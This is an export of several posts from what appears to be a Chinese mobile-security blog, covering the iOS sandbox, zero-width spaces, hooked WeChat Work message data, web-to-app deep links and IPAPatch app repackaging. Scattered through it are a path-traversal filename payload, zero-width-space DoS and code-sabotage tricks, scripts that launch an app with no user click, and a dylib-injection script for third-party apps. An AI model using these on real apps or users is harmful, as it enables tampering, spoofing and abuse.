/private/var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35258D87 Bundle Containerbundle的概念源自于NeXTSTEP，它是一个按某种标准结构来组织的目录，Bundle中包含了二进制文件及运行所需的资源。 正向开发中常见的App和framework都是以bundle的形式存在。在越狱iOS中常见的PreferenceBundle是一种依附于Settings的App，结构与App类似，本质也是bundle。Framework也是bundle，但framework的bundle中存放的是一个dylib（动态库），而非可执行文件。 在正向开发时，我们上传至App Store的ipa（iPhone Application）包，解压后会有一个Payload目录，其内部又包含一个.app目录，这个目录就是一个App的目录结构，也是一个bundle。 Bundle Container位于/var/mobile/Containers/Bundle/Application/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX/主要用于存放静态资源，主要包含以下目录和文件： MyApp.app存放可执行文件和资源文件，包括：打包时的资源文件、本地文件、可执行文件、.plist文件。这个目录不会被iTunes同步。 iTunesArtWork iTunesMetadata.plist Data ContainerData Container位于/var/mobile/Containers/Data/Application/YYYYYYYY-YYYY-YYYY-YYYYYYYYYYYY/，主要用于存放App运行时产生的动态数据，其主要包含以下目录和文件： Documents存放应用运行时生成的并且需要保存的不可再生数据。注：iTunes或iCloud同步设备时会备份该目录 Library Library/Caches 存放应用运行时生成且需要保存的可再生数据，比如网络请求，用户需要负责删除对应文件。iTunes或iCloud不同步。 Library/Preferences 存放偏好设置。使用NSUserDefaults写的设置数据都会保存在该目录下的一个plist文件中。iTunes或iCloud同步设备时备份该目录。 tmp存放应用下次启动不再需要的临时文件。当应用不再需要这些文件的时候，需要主动将其删除。（当应用不再运行的时候，系统可能会将此目录清空。）这个目录不会被iTunes同步。 沙盒路径获取123456789101112131415161718// 沙盒目录NSLog(@&quot;%@&quot;,NSHomeDirectory()); // MyApp.appNSLog(@&quot;%@&quot;,[[NSBundle mainBundle] bundlePath]); // DocumentsNSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);NSString *docPath = [paths objectAtIndex:0];NSLog(@&quot;%@&quot;,docPath); // LibraryNSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);NSString *libPath = [paths objectAtIndex:0];NSLog(@&quot;%@&quot;,libPath); // tmpNSLog(@&quot;%@&quot;,NSTemporaryDirectory()); iOS二进制文件iOS逆向的目标主要包含三类二进制文件：Application、Dynamic Library、Daemon ApplicationApplication，即我们最熟悉的App。App的Bundle目录有以下三个部分比较重要： Info.plistInfo.plist记录了App的基本信息，如：bundle identifier、可执行文件名、图标文件名等。 可执行文件查看Info.plist，即可定位可执行文件 lproj目录lproj目录下存放的是各种本地化的字符串 系统App VS. StoreApp/Applications/目录下存放系统App（包括CydiaApp）；/var/mobile/Containers/目录下存放StoreApp。其区别在于： 目录结构两种App的Bundle目录区别不大，都含有Info.plist、可执行文件、lproj目录等。只是Data目录的位置不同：StoreApp的数据目录在/var/mobile/Containers/Data/下，以mobile权限运行的系统App的数据目录在/var/mobile/下，以root权限运行的系统App的数据目录在/var/root/下。 安装格式和权限Cydia App的安装格式一般是deb，StoreApp的安装格式一般是ipa。前者的属主用户和属主组一般是root和admin，能够以root权限运行；后者的属主用户和属主组都是mobile，只能以mobile权限运行。 Dynamic LibraryDynamic Library简称dylib，即动态链接库。在正向开发中，在Xcode工程中导入的各种framework，链接的各种lib，其本质都是dylib。 在iOS中，lib分为static和dynamic两种，其中static lib在编译阶段成为App可执行文件的一部分，会增加可执行文件的大小。dylib则不会改变可执行文件的大小，只有当App运行时调用到dylib时，iOS才会把它加载进内存，成为App进程的一部分。 dylib是逆向工程的重要目标类型，但其本身并不是可执行文件，不能独立运行，只能为别的进程服务，而且它们寄生在别的进程里，成为这个进程的一部分。因此，dylib的权限是由它寄生的那个App决定的，同一个dylib寄生在系统App和StoreApp里时的权限是不同的。 越狱iOS中，Cydia里的各种tweak无一不是以dylib的形式工作的。 DaemoniOS的daemon主要由一个可执行文件和一个plist文件构成。iOS的根进程是launchd，其会在开机时检查/System/Library/LaunchDaemons和/Library/LaunchDaemons下所有格式符合规定的plist文件，然后启动对应的daemon。这里的plist文件与App中的Info.plist文件作用类似，即记录Daemon的基本信息。 配置文件（provisioning profile）和开发者证书iOS有严格的代码签名检测，只用通过签名检测的代码才可以运行，而代码签名需要provisioning profile。 provisioning profile（供应配合文件）是由苹果签名的一个plist文件，Provisioning Profile文件包含了：证书，App ID，设备，后缀名为.mobileprovision。Provisioning Profile决定Xcode用哪个证书（公钥）/私钥组合（Key Pair/Signing Identity）来签署应用程序（Signing Product）,将在应用程序打包时嵌入到.ipa包里。安装应用程序时，Provisioning Profile文件被拷贝到iOS设备中，运行该iOS App的设备也通过它来认证安装的程序。 如果要打包或者在真机上运行一个APP，一般要经历以下三步： 首先，需要证书对应的私钥来进行签名，用于标识这个APP是合法、安全、完整的； 其次，需要指明它的App ID，并且验证Bundle ID是否与其一致； 最后，如果是真机调试，需要确认这台设备是否授权运行该APP。 获得Provisioning Profile和证书有两个途径： 1. 注册iOS开发者账号在https://developer.apple.com/programs/enroll/ 上注册开发者账号，个人开发者需要缴纳99$费用，这种途径开发的应用可以在apple store上发行。使用如下命令可以列出所有的账号： 123$ security find-identity -p codesigning -v 1) 61FA3547E0AF42A11E233F6A2B255E6B6AF262CE &quot;iPhone Distribution: Vantage Point Security Pte. Ltd.&quot; 2) 8004380F331DCA22CC1B47FB1A805890AE41C938 &quot;iPhone Developer: Bernhard Müller (RV852WND79)&quot; 2. 使用iTunes账号apple允许配置一个免费的provisioning profile，允许在设备上对自己开发的应用进行调试，但不能上传到apple store上。 参考： https://www.jianshu.com/p/351be39f959e https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/ 参考资料： iOS逆向工程基础篇 http://chuquan.me/2018/02/06/ios-reverse-engineering-basis/ owasp - Setting up a Testing Environment for iOS Apps https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md iOS底层基础知识-文件目录结构 http://www.cnblogs.com/wujy/archive/2016/02/13/5188302.html mac os术语表 https://bbs.feng.com/read-htm-tid-249.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[零宽度空格 Zero-width space]]></title>
    <url>%2F2018%2F05%2F14%2F%E9%9B%B6%E5%AE%BD%E5%BA%A6%E7%A9%BA%E6%A0%BC-Zero-width-space%2F</url>
    <content type="text"><![CDATA[0x0 简介零宽度空格，顾名思义即，具有空格的功能，但宽度为零。例如：1Left​​​​​​​​​​Right 上述文本中，我们看到的是LeftRight，但实际上在Left和Right之间有10个Zero-width space，它不占用宽度，但占用字节空间。 0x1 实例Zero-width space的Unicode编码为U+FEFF，二进制编码为“\xE2\x80\x8E”,根据维基百科描述，其主要用于后台处理字符边界而又无需可见空格的情况。 例如，下边两个字符串，我们在任意位置鼠标双击时会看到明显效果， 包含Zero-width space，双击任意位置选中某个单词1Lorem​Ipsum​Dolor​Sit​Amet​Consectetur​Adipiscing​Elit​Sed​Do​Eiusmod​Tempor​Incididunt​Ut​Labore​Et​Dolore​Magna​Aliqua​Ut​Enim​Ad​Minim​Veniam​Quis​Nostrud​Exercitation​Ullamco​Laboris​Nisi​Ut​Aliquip​Ex​Ea​Commodo​Consequat​Duis​Aute​Irure​Dolor​In​Reprehenderit​In​Voluptate​Velit​Esse​Cillum​Dolore​Eu​Fugiat​Nulla​Pariatur​Excepteur​Sint​Occaecat​Cupidatat​Non​Proident​Sunt​In​Culpa​Qui​Officia​Deserunt​Mollit​Anim​Id​Est​Laborum 不含Zero-width space，双击任意位置选中全部字符1LoremIpsumDolorSitAmetConsecteturAdipiscingElitSedDoEiusmodTemporIncididuntUtLaboreEtDoloreMagnaAliquaUtEnimAdMinimVeniamQuisNostrudExercitationUllamcoLaborisNisiUtAliquipExEaCommodoConsequatDuisAuteIrureDolorInReprehenderitInVoluptateVelitEsseCillumDoloreEuFugiatNullaPariaturExcepteurSintOccaecatCupidatatNonProidentSuntInCulpaQuiOfficiaDeseruntMollitAnimIdEstLaborum 0x2 攻击DoS攻击由于该字符不显示但占用空间，故可以用来发送大量的该字符来DoS，用户看不到任何字符，但已经把空间占满。例如，对QQ、微信等DoS攻击 PS: 微信发送的纯文本大小为16K,测试大量零宽度空格不影响。 UI Spoof例如CTF题目中提交flag时可以加几个这个字符 再例如在字符串相等判断的代码里加几个这个字符，搞死抄袭代码的程序员:) 参考文献 维基百科 https://en.wikipedia.org/wiki/Zero-width_space]]></content>
  </entry>
  <entry>
    <title><![CDATA[企业微信的消息]]></title>
    <url>%2F2018%2F05%2F11%2F%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E7%9A%84%E6%B6%88%E6%81%AF%2F</url>
    <content type="text"><![CDATA[LocationMessageHook “com.tencent.wework.foundation.model.pb.WwRichmessage$LocationMessage”函数消息内容12345address: &quot;\345\214\227\344\272\254\345\270\202\345\214\227\344\272\254\345\270\202\346\265\267\346\267\200\345\214\272\345\275\251\345\222\214\345\235\212\350\267\257\345\214\227\345\233\233\347\216\257\350\245\277\350\267\25766\345\217\267&quot;latitude: 39.984293longitude: 116.307449title: &quot;\345\214\227\345\233\233\347\216\257\350\245\277\350\267\25766\345\217\267&quot;zoom: 15.0 FileMessageHook “com.tencent.wework.foundation.model.pb.WwRichmessage$FileMessage”函数 filename曾经存在路径穿越漏洞，通过hook String.getBytes()修改filename为”../../../hack.zip”123456789101112131415161718192021222324252627282930313233aes_key: &quot;&quot;decrypt_ret: -1encrypt_key: &quot;&quot;encrypt_size: 0extra: &quot;&quot;file_id: &quot;&quot;file_name: &quot;open_screen_bg_img_1557.png&quot;flags: 0height: 0is_hd: falseiscomplex: falsemd5: &quot;&quot;mid_img_size: 0mid_thumbnail_file_id: &quot;&quot;mid_thumbnail_path: &quot;/storage/emulated/0/Tencent/WeixinWork/uploadTempMidbimage/00ceba176d6be5ef68f045defd4280c0.midimage&quot;random_key: &quot;&quot;receiver_deviceid: &quot;&quot;sender_deviceid: &quot;&quot;session_id: &quot;&quot;size: 116907thumb_img_size: 0thumbnail_file_id: &quot;&quot;thumbnail_path: &quot;/storage/emulated/0/Tencent/WeixinWork/uploadTempThumbimage/00ceba176d6be5ef68f045defd4280c0.thumbimage&quot;url: &quot;/storage/emulated/0/wandoujia/downloader/openscreen/open_screen_bg_img_1557.png&quot;voice_time: 0wechat_auth_key: &quot;&quot;wechat_cdn_ld_aeskey: &quot;&quot;wechat_cdn_ld_height: 193wechat_cdn_ld_md5: &quot;&quot;wechat_cdn_ld_size: 0wechat_cdn_ld_url: &quot;&quot;wechat_cdn_ld_width: 290width: 0 EmotionMessage12345678910111213141516aes_key: &quot;&quot;create_time: 0description: &quot;\345\271\262\345\276\227\346\274\202\344\272\256&quot;file_id: &quot;&quot;group_id: &quot;100&quot;height: 240md5: &quot;eb1de22cdf24034f2c06edebc529e90c&quot;random_url: &quot;&quot;size: 0source_type: 1src: 2static_url: &quot;http://p.qpic.cn/pic_wework/1802732579/04027e002a09edf9965ee6fd369f87b6390c933341504f32/0&quot;type: 2url: &quot;http://p.qpic.cn/pic_wework/1802732579/ecea96e80f0c70e81b6d5107416cec562326901d20a61bc4/0&quot;width: 240wx_emotion_buffer: &quot;&quot; RichMessage 普通文本 1234messages &lt; content_type: 0 data: &quot;\012\025\345\207\217\350\202\245\346\225\210\346\236\234\351\203\275\345\207\221\345\207\221&quot;&gt; emoji表情 1234messages &lt; content_type: 3 data: &quot;\012\005[\350\211\262]&quot;&gt; VideoMessage1234567891011121314151617181920aes_key: &quot;6f899d3e4c364a2baa70cfce00617a03&quot;decrypt_ret: -1encrypt_key: &quot;&quot;encrypt_size: 1029481flags: 0md5: &quot;4b49f7136f83d563c08a0fce5d7d61d0&quot;preview_img_aes_key: &quot;&quot;preview_img_md5: &quot;3648cc2101f076f4e4a1a3ad47958d64&quot;preview_img_size: 10318preview_img_url: &quot;/storage/emulated/0/Tencent/WeixinWork/tempimagecache/1688851907317093/video_thumb/6a362d3586f5bd8e07472a543ecd37d0_thumb.wwdata&quot;random_key: &quot;&quot;session_id: &quot;&quot;size: 1029481thumbnail_file_id: &quot;&quot;url: &quot;/storage/emulated/0/DCIM/WeixinWork/mmexport1526034101689.mp4&quot;video_duration: 5video_height: 1280video_id: &quot;3069020102046230600201000204cf40798d02030f424202042a8dcf8c02045af56eb7042430626334356235372d316161322d346363362d393831312d37643232396236373362393102010002030fb57004104b49f7136f83d563c08a0fce5d7d61d00201040201000400&quot;video_width: 720wechat_auth_key: &quot;&quot; 其他消息123456789101112131415161718192021WwRichmessage.pOSTSHAREDMESSAGE = Extension.createMessageTyped(11, PostSharedMessage.class, 810);WwRichmessage.cARDSHAREDMESSAGE = Extension.createMessageTyped(11, BusinessCardShareMessage.class, 818);WwRichmessage.aTTENDANCESHAREDMESSAGE = Extension.createMessageTyped(11, AttendanceRecordShareMessage.class, 826);WwRichmessage.wORKLOGSHAREDMESSAGE = Extension.createMessageTyped(11, WorkLogRecordShareMessage.class, 834);WwRichmessage.aPPROVALSHAREDMESSAGE = Extension.createMessageTyped(11, ApprovalShareMessage.class, 842);WwRichmessage.wORKLOGSHAREDMESSAGEV2 = Extension.createMessageTyped(11, WorkLogRecordShareMessage.class, 850);WwRichmessage.wEAPPMESSAGE = Extension.createMessageTyped(11, WeAppMessage.class, 858);WwRichmessage.rICHMESSAGE = Extension.createMessageTyped(11, RichMessage.class, 810);WwRichmessage.vIDEOMESSAGE = Extension.createMessageTyped(11, VideoMessage.class, 818);WwRichmessage.fILEMESSAGE = Extension.createMessageTyped(11, FileMessage.class, 826);WwRichmessage.lOCATIONMESSAGE = Extension.createMessageTyped(11, LocationMessage.class, 834);WwRichmessage.lINKMESSAGE = Extension.createMessageTyped(11, LinkMessage.class, 842);WwRichmessage.eMOTIONMESSAGE = Extension.createMessageTyped(11, EmotionMessage.class, 850);WwRichmessage.fORWARDMESSAGES = Extension.createMessageTyped(11, ForwardMessages.class, 858);WwRichmessage.iNVITEMESSAGE = Extension.createMessageTyped(11, InviteMessage.class, 8010);WwRichmessage.aPPMESSAGE = Extension.createMessageTyped(11, AppMessage.class, 8026);WwRichmessage.iNVITEMEMBERENTERMESSAGE = Extension.createMessageTyped(11, InviteMemberEnterMessage.class, 8042);WwRichmessage.aPPTEVENTMESSAGE = Extension.createMessageTyped(11, ApptEventMessage.class, 8106);WwRichmessage.iTILHBINVITEMESSAGE = Extension.createMessageTyped(11, ItilHBInviteMessage.class, 8130);WwRichmessage.aPPMARKETINFOMESSAGE = Extension.createMessageTyped(11, AppMarketInfoMessage.class, 8138);WwRichmessage.cOMMONTIBCARDMESSAGE = Extension.createMessageTyped(11, CommonTitleImgBtnCardMessage.class, 8154);]]></content>
  </entry>
  <entry>
    <title><![CDATA[Web调起APP研究]]></title>
    <url>%2F2018%2F04%2F28%2FWeb%E8%B0%83%E8%B5%B7APP%E7%A0%94%E7%A9%B6%2F</url>
    <content type="text"><![CDATA[应用开发中经常会有从web端启动App的需求，这里总结了常见的几种方式。 Android0x0 自定义schemeAndroid上常用的是通过scheme协议的方式唤醒本地app客户端。即App在AndroidManifest.xml中为要打开的Activity注册一个intent-filter,添加scheme,并注明host和data等关键字段，前端保持一致后就可以实现在Web页中调起本地App了。 注册scheme的代码如下：1234567&lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt; &lt;!--BROWSABLE指定该Activity能被浏览器安全调用--&gt; &lt;data android:host=&quot;xyz.com&quot; android:scheme=&quot;m4bln&quot;/&gt;&lt;/intent-filter&gt; 这里的action、category、data都必须完全匹配才能获得intent，android.intent.category.DEFAULT是默认的，有实际意义的是android.intent.category.BROWSABLE，表示允许通过浏览器启动该activity（调起App）。data限定了触发条件，当scheme为m4bln且host为xyz.com时才匹配，例如浏览器访问m4bln://xyz.com，能够匹配成功，App就起来了。 0x1 Web页打开App通过Web页打开App有多种方式，打开方式也因直接在浏览器打开和在webview中打开而异，这里分别进行尝试： a标签1&lt;a href=&quot;m4bln://xyz.com&quot;&gt;打开App&lt;/a&gt; location.href1document.location.href=&quot;m4bln://xyz.com&quot; iframe1&lt;iframe src=&quot;m4bln://xyz.com&quot;&gt;&lt;/iframe&gt; 注意：安卓chrome 浏览器version 25之后版本发生了改变。不能在通过设置iframe标签的src属性来启动app了。取而代之的是通过自定义scheme实现用户手势启动app或者使用Chrome Intent语法（参考下文） 这里我们对比在浏览器中和webview中打开页面的情况： 浏览器中打开根据官方文档, Chrome浏览器在通过自定义Scheme唤起App的时候，需要绑定用户的点击事件触发，而在浏览器地址栏里直接输入是不可以的。 因此，当我们想要用户打开网页就直接进入App时，在Chrome浏览器地址栏里直接输是无法实现的，但可以通过其他方式实现，例如绑定所有的事件，让用户碰一下屏幕还是可以轻松做到的，参考自动写入剪贴板的实现，而通过点击url的方式则可以自动唤起App。 例如，用户点开短信中的url,此时无需用户点击便可以自动唤起App。（参考之前对于支付宝的克隆攻击Demo） WebView中自动唤起App实现代码可能如下： 对于a标签 123456&lt;a id=&quot;a&quot; href=&quot;m4bln://xyz.com&quot;&gt;打开App&lt;/a&gt;&lt;script&gt;window.onload=function()&#123;document.getElementById(&quot;a&quot;).click();&#125;&lt;/script&gt; 对于location.href 12345&lt;script&gt;window.onload=function()&#123;document.location.href=&quot;m4bln://xyz.com&quot;;&#125;&lt;/script&gt; WebView中打开在webview中，直接通过loadurl(“m4bln://xyz.com”)是无法打开App的，需要使用shouldOverrideUrlLoading和shouldInterceptRequest进行拦截和处理。 注：shouldOverrideUrlLoading 用于拦截页面切换shouldInterceptRequest 拦截所有的资源请求，例如css,js,iframe shouldOverrideUrlLoading is called when a new page is about to be opened whereas shouldInterceptRequest is called each time a resource is loaded like a css file, a js file etc 因此，对于a标签或document.location都属于页面切换类型，所以用shouldOverrideUrlLoading来实现处理123456789101112131415161718192021222324252627282930313233343536wv.setWebViewClient(new WebViewClient()&#123;/*注： 在Android N中 shouldOverrideUrlLoading(WebView view, String url)被废弃，改为shouldOverrideUrlLoading(WebView view, WebResourceRequest request),通过request.getUrl()来获取url。@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url) &#123; if(你想在当前页面打开新连接)&#123; view.loadUrl(url); &#125;else if(在一个新的activity中打开新连接)&#123; Intent intent = new Intent(mContext, NewWebViewActivity.class); intent.putputExtra(&quot;URL&quot;, url); startActivity(intent); &#125; return true; &#125;*/@Overridepublic boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) &#123; String url=&quot;&quot;; try&#123; url = request.getUrl().toString(); if(url.startsWith(&quot;m4bln://&quot;))&#123; Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url)); startActivity(intent); return true; &#125; &#125;catch (Exception e)&#123; return false; &#125; view.loadUrl(url); return true;&#125;&#125;); 而对于iframe，上文中虽然提到在浏览器中无法达到目的，但在webview中可以通过shouldInterceptRequest来实现。 1234567891011121314/*注： shouldInterceptRequest(WebView view, String url)同样被废弃，这里不再描述*/@Overridepublic WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) &#123; String scheme = request.getUrl().getScheme(); if (scheme.equals(&quot;m4bln&quot;)) &#123; Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(request.getUrl().toString())); startActivity(intent); return null; &#125; return super.shouldInterceptRequest(view, request);&#125; webview完成上述设置后，使用webview加载web页面，均可以实现一启动便自动唤起对应的App。 需要注意的是： 不是使用webview.loadurl(“m4bln://xyz.com”)直接加载scheme,loadurl加载的是和上述浏览器部分相同的web页。 如果webview没有作相应的设置，是无法再通过scheme打开其他App的 有人曾经想过利用自定义scheme实现App之间的一个循环启动，实现loop还得取决于App中的webview是如何配置的 App的webview里利用自己的scheme唤起自己确实会导致死循环 0x2 Chrome Intent为了更有序的打通浏览器页面和本地应用推出了Chrome Intent机制，作为标准协议进行推广，其格式如下：123456789intent: HOST/URI-path // Optional host #Intent; package=[string]; action=[string]; category=[string]; component=[string]; scheme=[string]; end; 当打开本地App失败的时候，还可以使用如下代码重定向到一个新页面，例如App下载页等。1S.browser_fallback_url=[encoded_full_url] S.用来传递string类型的参数，i.用来传递整数类型参数，例如： 123456789101112intent://foobar/#Intent;action=myaction;type=text/plain;S.xyz=123;i.abc=678;end 其他参数类型如下：String =&gt; &apos;S&apos; Boolean =&gt;&apos;B&apos; Byte =&gt; &apos;b&apos; Character =&gt; &apos;c&apos; Double =&gt; &apos;d&apos; Float =&gt; &apos;f&apos; Integer =&gt; &apos;i&apos; Long =&gt; &apos;l&apos; Short =&gt; &apos;s&apos; 对于上述例子，我们构造intent为：1intent://xyz.com#Intent;scheme=m4bln;package=com.m4bln.webviewgps;S.browser_fallback_url=https%3A%2F%2Fwww.baidu.com;end 需要注意的是： package、action等字段非必须，取决于应用的AndroidMenifest.xml配置，上述例子中使用”intent://xyz.com#Intent;scheme=m4bln;end”也可以成功唤起App.(参照Android源码中对intent://的解析 http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/content/Intent.java#5044) 除了intent://，intent:，android-app://可以达到同样效果，同样参照源码 仅有Chrome支持这种方式，部分国产浏览器屏蔽了intent://这种scheme Chrome Intent同样需要用户点击事件, “#Intent”中的“I”必须为大写！！！ Chrome Intent在webview里不支持，同样需要shouldInterceptRequest等来处理 App获取Web传参1234567891011121314151617181920@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; //... // 获取uri参数 Intent intent = getIntent(); String scheme = intent.getScheme(); Uri uri = intent.getData(); String str = &quot;&quot;; if (uri != null) &#123; String host = uri.getHost(); String dataString = intent.getDataString(); String from = uri.getQueryParameter(&quot;from&quot;); String path = uri.getPath(); String encodedPath = uri.getEncodedPath(); String queryString = uri.getQuery(); //...根据uri判断打开哪个页，或者打开哪个功能 &#125;&#125; 0x3 App监听本地特定端口参照WormWhole漏洞（http://www.freebuf.com/vuls/83789.html） iOS0x0 自定义Scheme在Info.plist中配置Scheme 1234567891011&lt;key&gt;CFBundleURLTypes&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;CFBundleURLName&lt;/key&gt; &lt;string&gt;com.xyz&lt;/string&gt; &lt;key&gt;CFBundleURLSchemes&lt;/key&gt; &lt;array&gt; &lt;string&gt;m4bln&lt;/string&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/array&gt; 0x1 Universal linksUniversal links为iOS9上一个所谓通用链接的深层链接特性，一种能够方便的通过传统HTTP链接来启动app，使用相同的网址打开网站和app；通过唯一的网址，就可以链接一个特定的视图到你的app里面，不需要特别的scheme。 通过scheme启动app时，浏览器会弹出确认框提示用户是否打开，Universal links不会提示，体验更好； Universal links可在微信浏览器中打开外部app 参考资料： Chrome官方文档 shouldoverrideurlloading和shouldinterceptrequest区别 Android scheme呼起App iOS中的URL Scheme iOS Universal Links(通用链接)的使用]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全—— IPAPatch免越狱调试、修改第三方App]]></title>
    <url>%2F2018%2F04%2F17%2F%E4%BD%BF%E7%94%A8IPAPatch%E5%85%8D%E8%B6%8A%E7%8B%B1%E8%B0%83%E8%AF%95%E3%80%81%E4%BF%AE%E6%94%B9%E7%AC%AC%E4%B8%89%E6%96%B9App%2F</url>
    <content type="text"><![CDATA[简介IPAPatch可以实现免越狱调试、修改第三方APP,其原理主要是基于砸壳的APP进行修改和签名，并安装在真机设备上，类似于重打包。 项目地址：https://github.com/Naituw/IPAPatch IPAPatch基于Xcode实现，整个过程在 Xcode 中进行，就像在编写自己的 App，此外： 支持链接第三方 Framework 在 Xcode 中可以直接断点进行调试，可以用 lldb 命令（如 po），输出运行时信息 可以使用 Xcode 的调试功能查看 View Hierarchy、Memory Graph 等信息 修改过的 App 可以与原始 App 共存，并自动修改名字以作区分 实现原理主要的自动化过程在 patch.sh 这个脚本里，Xcode 会在把代码编译成 Framework 后执行这个脚本： 解压 IPA 文件 用 IPA 文件的内容，替换掉 Xcode 生成的 .app 的内容 通过 OPTOOL，将代码生成的 Framework 及其他外部 Framework，注入到二进制文件中 对这些文件进行重新签名 完成后，Xcode 会自动将修改过的 .app 安装到 iPhone 上 patch.sh的注释中写的很明确：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127# ---------------------------------------------------# 0. Prepare Working Enviromentrm -rf &quot;$TEMP_PATH&quot; || truemkdir -p &quot;$TEMP_PATH&quot; || trueDUMMY_DISPLAY_NAME=$(/usr/libexec/PlistBuddy -c &quot;Print CFBundleDisplayName&quot; &quot;$&#123;SRCROOT&#125;/$TARGET_NAME/Info.plist&quot;)echo &quot;DUMMY_DISPLAY_NAME: $DUMMY_DISPLAY_NAME&quot;TARGET_BUNDLE_ID=&quot;$PRODUCT_BUNDLE_IDENTIFIER&quot;echo &quot;TARGET_BUNDLE_ID: $TARGET_BUNDLE_ID&quot;# ---------------------------------------------------# 1. Extract Target IPAunzip -oqq &quot;$TARGET_IPA_PATH&quot; -d &quot;$TEMP_PATH&quot;TEMP_APP_PATH=$(set -- &quot;$TEMP_PATH/Payload/&quot;*.app; echo &quot;$1&quot;)echo &quot;TEMP_APP_PATH: $TEMP_APP_PATH&quot;# ---------------------------------------------------# 2. Overwrite DummyApp IPA with Target App ContentsTARGET_APP_PATH=&quot;$BUILT_PRODUCTS_DIR/$TARGET_NAME.app&quot;echo &quot;TARGET_APP_PATH: $TARGET_APP_PATH&quot;rm -rf &quot;$TARGET_APP_PATH&quot; || truemkdir -p &quot;$TARGET_APP_PATH&quot; || truecp -rf &quot;$TEMP_APP_PATH/&quot; &quot;$TARGET_APP_PATH/&quot;# ---------------------------------------------------# 3. Inject the Executable We Wrote and Built (IPAPatch.framework)APP_BINARY=`plutil -convert xml1 -o - $TARGET_APP_PATH/Info.plist|grep -A1 Exec|tail -n1|cut -f2 -d\&gt;|cut -f1 -d\&lt;`OPTOOL=&quot;$&#123;SRCROOT&#125;/Tools/optool&quot;mkdir &quot;$TARGET_APP_PATH/Dylibs&quot;cp &quot;$BUILT_PRODUCTS_DIR/IPAPatch.framework/IPAPatch&quot; &quot;$TARGET_APP_PATH/Dylibs/IPAPatch&quot;for file in `ls -1 $TARGET_APP_PATH/Dylibs`; do echo -n &apos; &apos; echo &quot;Install Load: $file -&gt; @executable_path/Dylibs/$file&quot; $OPTOOL install -c load -p &quot;@executable_path/Dylibs/$file&quot; -t $TARGET_APP_PATH/$APP_BINARY &gt;&amp; /dev/nulldonechmod +x &quot;$TARGET_APP_PATH/$APP_BINARY&quot;# ---------------------------------------------------# 4. Inject External Frameworks if ExistsTARGET_APP_FRAMEWORKS_PATH=&quot;$BUILT_PRODUCTS_DIR/$TARGET_NAME.app/Frameworks&quot;echo &quot;Injecting Frameworks from $FRAMEWORKS_TO_INJECT_PATH&quot;for file in `ls -1 $&#123;FRAMEWORKS_TO_INJECT_PATH&#125;`; do extension=&quot;$&#123;file##*.&#125;&quot; echo &quot;$file &apos;s extension is $extension&quot; if [ &quot;$extension&quot; != &quot;framework&quot; ] then continue fi filename=&quot;$&#123;file%.*&#125;&quot; cp &quot;$FRAMEWORKS_TO_INJECT_PATH/$file/$filename&quot; &quot;$TARGET_APP_PATH/Dylibs/$filename&quot; echo -n &apos; &apos; echo &quot;Install Load: $file -&gt; @executable_path/Dylibs/$filename&quot; $OPTOOL install -c load -p &quot;@executable_path/Dylibs/$filename&quot; -t $TARGET_APP_PATH/$APP_BINARY &gt;&amp; /dev/nulldone# ---------------------------------------------------# 5. Remove Plugins (AppExtensions), To Simplify the Signing Processrm -rf &quot;$TARGET_APP_PATH/PlugIns&quot; || true# ---------------------------------------------------# 7. Update Info.plist for Target AppTARGET_DISPLAY_NAME=$(/usr/libexec/PlistBuddy -c &quot;Print CFBundleDisplayName&quot; &quot;$TARGET_APP_PATH/Info.plist&quot;)TARGET_DISPLAY_NAME=&quot;$DUMMY_DISPLAY_NAME$TARGET_DISPLAY_NAME&quot;/usr/libexec/PlistBuddy -c &quot;Set :CFBundleIdentifier $PRODUCT_BUNDLE_IDENTIFIER&quot; &quot;$TARGET_APP_PATH/Info.plist&quot;/usr/libexec/PlistBuddy -c &quot;Set :CFBundleDisplayName $TARGET_DISPLAY_NAME&quot; &quot;$TARGET_APP_PATH/Info.plist&quot;# ---------------------------------------------------# 8. Code Sign All The Thingsfor DYLIB in &quot;$TARGET_APP_PATH/Dylibs/&quot;*do FILENAME=$(basename $DYLIB) /usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; &quot;$DYLIB&quot;doneif [ -d &quot;$TARGET_APP_FRAMEWORKS_PATH&quot; ]; thenfor FRAMEWORK in &quot;$TARGET_APP_FRAMEWORKS_PATH/&quot;*do FILENAME=$(basename $FRAMEWORK) /usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; &quot;$FRAMEWORK&quot;donefi/usr/bin/codesign --force --sign &quot;$EXPANDED_CODE_SIGN_IDENTITY&quot; --timestamp=none &quot;$TARGET_APP_PATH/$APP_BINARY&quot;# ---------------------------------------------------# 9. Install## Nothing To Do, Xcode Will Automatically Install the DummyApp We Overwrited 使用方法 Clone或下载IPAPatch项目到本地 准备砸过壳的IPA文件可以在 http://www.iphonecake.com 上找The IPA file you use need to be decrypted, you can get 替换项目中的IPA将IPAPatch/Assets/app.ipa替换为自己的ipa,名字必须为app.ipa 准备External Frameworks (非必须)目录在IPAPatch/Assets/Frameworks. 